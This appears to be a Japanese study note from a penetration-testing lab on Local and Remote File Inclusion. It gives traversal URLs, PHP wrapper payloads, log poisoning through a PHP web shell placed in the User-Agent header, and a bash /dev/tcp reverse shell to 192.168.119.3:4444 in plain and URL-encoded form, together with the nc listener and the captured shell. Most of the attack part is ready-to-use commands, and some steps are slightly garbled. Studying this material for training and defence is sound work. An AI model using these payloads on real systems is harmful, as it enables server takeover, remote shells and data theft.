# 概要

**Local File Inclusion (LFI)** は、攻撃者がサーバー上のファイルを含めることで、リモートからシステムの情報を取得したり、コマンドを実行したりする攻撃手法です。  
一方、**Remote File Inclusion (RFI)** は、リモートのファイルをサーバーに含めて、任意のコードを実行する攻撃手法です。
#### LFIとRFIの違い
- LFIはサーバー上のローカルファイルをインクルードします。
- RFIはリモートからのファイルをインクルードします。
#### LFIとディレクトリトラバーサルの違い
- ディレクトリトラバーサル ファイルの内容を読み取るのみ
- ローカルファイルまたはリモートファイルを実行できる
---
# Local File Inclusion (LFI)

#### コマンド実行の例

以下のURLを使用して、リモートでコマンドを実行します：
```bash
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
```
上記の例では、whoamiコマンドをcmdパラメータに渡して実行しています。

- リバースシェルの実行
リバースシェルを実行するには、次のコマンドをcmdパラメータに渡します：
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

- URLエンコードされたリバースシェル
次のように、リバースシェルコマンドをURLエンコードして送信します：
```bash
%20-c%20%22```bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

- PHP Wrapperを利用したLFI
PHPのWrapperを使用して、ファイルの内容をリモートから取得します：
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php"
```
---
## 例　ログポイズニング
### /var/log/apache2/access.logにコードを書き込む
1. curlを使って、発見したディレクトリトラバーサルの脆弱性を利用してファイルaccess.logを表示
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

```
# 出力
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```
ログエントリにユーザーエージェントが含まれていることを示している。

### 以降Burpを使用

2. リクエストを送信する前に、Burpでユーザーエージェントを変更し、 access.logファイル に書き込む内容を指定する。
```bash
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
```
![](../../../../Assets/Images/Pasted%20image%2020260429180653.png)

3. 送信
- User-Agent内のphpコードがaccess.logに書き込まれる
- 以降、ターゲット システムでコマンドを実行できるようになり、これを利用して除法取得、リバース シェルの取得及びSSH キーを ユーザーのauthorized_keysファイルに追加したりできるようになる
3. 情報の取得
```bash
# Burp RepeaterのGETの行を以下に書き換え送信
# cmd=id
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id HTTP/1.1

# cmd=dir
GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=dir HTTP/1.1

# cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt
GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt HTTP/1.1
```
![](../../../../Assets/Images/Pasted%20image%2020260429180702.png)
5. リバースシェル
ncで待ち受ける
```bash
nc -nlvp 4444
```
以下をエンコードする
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
⏬ URLエンコード
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
送信
```bash
curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/apache2/access.log/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
結果
```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
```
![](../../../../Assets/Images/Pasted%20image%2020260429180713.png)
---
# コマンド内のスペースの対応
## 概要
送信するコマンドに以下のようにスペースが入っているとエラーになる場合がある
```bash
ls -la
cat /etc/passwd
```

## 対処方法
IFSを使用して、スペースの解釈方法を変更する
```bash
IFS=' '  # Set IFS to space
input="cat /etc/passwd"

read -r cmd arg <<< "$input"
$cmd $arg
```
上記の例ではスペースは%20と解釈される
```bash
curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/apache2/access.log/?cmd=ls%20-ls HTTP/1.1
```
